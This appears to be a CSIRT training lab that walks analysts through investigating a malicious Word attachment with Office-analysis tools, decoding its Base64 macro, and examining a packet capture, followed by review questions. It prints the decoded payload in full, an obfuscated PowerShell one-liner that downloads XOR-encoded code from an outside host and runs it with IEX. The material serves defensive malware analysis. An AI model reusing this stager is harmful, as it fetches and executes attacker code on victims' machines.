# Analyzing Office Docs

Here is a walkthrough showing how the Windows VM and the SIFT-REMnux VM
can be used to investigate a malicious document detected on one of our
systems.  Malicious office documents are frequently used in targeted
attacks and phishing campaigns.  They can carry hidden macros, OLE
objects, executables, etc., which can run as soon as the user opens the
document.  Common actions include downloading malware, exploiting system
vulnerabilities, or quietly hiding for long term persistence.

In this example, a malicious document named
"CurrentSalariesReview2017.docx" was received by a user in an email. 
When Invincea prevented it from being opened, the user downloaded it to
their share drive to open it.  A few days later during a weekly scan, AV
alerted and flagged the file as possible malware.  Use the files below,
located on the CSIRT OOB, to investigate and explain what happened:

    /CSIRT/Sample-Files/CurrentSalariesReview2017.docx

    /CSIRT/Sample-Files/CSIRT-pcap-2.pcapng

## On your Windows VM:

### OfficeMalScanner

This tool locates shellcode and VBA macros from MS Office
files  (located in C:\tools directory)

- Open a command prompt

- Navigate to the directory by typing `cd C:\tools\OfficeMalScanner`

- Type `OfficeMalScanner.exe C:\Users\vm-user\Desktop\CurrentSalariesReview2017.doc scan brute debug`

- Examine results

### Offvis 

This tool shows raw contents and structure of an MS Office file, and identifies common exploits

- Open the program from the `C:\tools\OffVis` directory

- Click File -> Open

- Navigate to the CurrentSalariesReview2017.doc file and click Open

- Select option from the dropdown menu and then click Parse

- Browse the structures of the file

### Observe the document's behavior

- Watch system changes with RegShot, ProcMon, etc

- Monitor network traffic with TCPView, Wireshark

- Answer name queries and redirect traffic with FakeDNS

- Capture HTTP traffic with NetCat

### Send the file to your SIFT-REMnux VM for analysis

- Open a command prompt

- Use `pscp.exe` to transfer the file to the SIFT-REMnux VM securely

- Type `C:\Tools\pscp.exe <source> <destination>`


## On your SIFT-REMnux VM:

### pyOLEScanner

Scan for OLE

- Type `pyolescanner.py CurrentSalariesReview2017.docx`

- Explore the directory created by typing `cd CurrentSalariesReview2017`

- The directory word/embeddings shows the Word doc contains a Microsoft Excel file

### Olevba

Scan for VBA

- Type `olevba.py CurrentSalariesReview2017.docx`

- Examine results, looking for VBA code

### ClamAV

Open source antivirus engine for detecting malicious code and artifacts

- Type `clamscan CurrentSalariesReview2017.docx`

- Examine results, looking for signature/anomaly detections

### Hachoir-urwid

A binary file exploration utility used to navigate the structure of Office files to view stream contents

- To use the tool, type `hachoir-urwid CurrentSalariesReview2017.docx`

- Hit the down arrow key to select an item and hit Enter

- Navigate the different components that make up the file


## On your Windows VM:

### Open the Macro

- Go to View -> Macros -> View Macros and click Edit

- Copy the contents into a separate file named "macro.txt"

- Send the file named "macro.txt" to your SIFT-REMnux VM using `pscp.exe`

### Decode the Macro

This is encoded in Base64 but needs some work before decoding

- To see the file contents, type `cat macro.txt`

- To filter out lines with Base64, type `cat macro.txt | grep str`

- To filter even more, type `cat macro.txt | grep 'str ='`

- To cut a column out, type `cat macro.txt | grep 'str =' | cut -d
    '"' -f 2`

- To save results so far in a file, type `cat macro.txt | grep 'str
    =' | cut -d '"' -f 2 > file.txt`

- To see file contents type `cat file.txt`

- To cut the last string of the file out (the Base64 string), type
    `cat file.txt | cut -d " " -f 8 `

- To decode the string, type `cat file.txt | cut -d " " -f 8 |
    base64 -d`

- To save the decoded string to a file, type `cat file.txt | cut -d
    " " -f 8 | base64 -d > decoded.txt`

- To see the file contents, type `cat decoded.txt`

You should now see this:

```powershell
[SYstEm.NeT.SERVICePoInTMaNAgER]::EXpecT100ContInUE =
0;$WC=NEW-OBJect SYStem.NET.WeBCLieNt;$u='Mozilla/5.0 (Windows NT
6.1; WOW64; Trident/7.0; rv:11.0) like
Gecko';$wc.HeADerS.AdD('User-Agent',$u);$wc.PRoXY =
[SySTEM.Net.WeBRequEsT]::DEfAUlTWEBPrOxY;$Wc.ProXY.CREDenTiALs =
[SYSTEm.Net.CreDeNTiaLCAChE]::DEfAulTNETWorkCReDENtIALs;$K='8fp):o@ODJBV|wMZ_jKh?XT<{U+>~R=Q';$I=0;[cHaR[]]$B=([CHaR[]]($WC.DoWNlOADStRiNg("http://msofficeupdatesdb:80/index.asp")))|%{$_-bXOr$K[$i++%$K.LengTH]};IEX
($B-joIn'')
```

### Network Traffic Analysis

- Open CSIRT-pcap-2.pcapng with Wireshark

- Use information gathered from the file to identify the attacker's
    machine

- Use display filter to isolate traffic between the attacker and the
    victim machines

- Examine the traffic

## Questions

1. What does this PowerShell one-liner do?

2. Why are there a mix of upper and lower case letters?

3. What valuable information is contained in these commands that can
    help us with other compromised systems?

4. What exactly is it in the document that creates the network traffic?

5. What tool do you think was used to compromise the system?

6. What URL was used for beaconing?
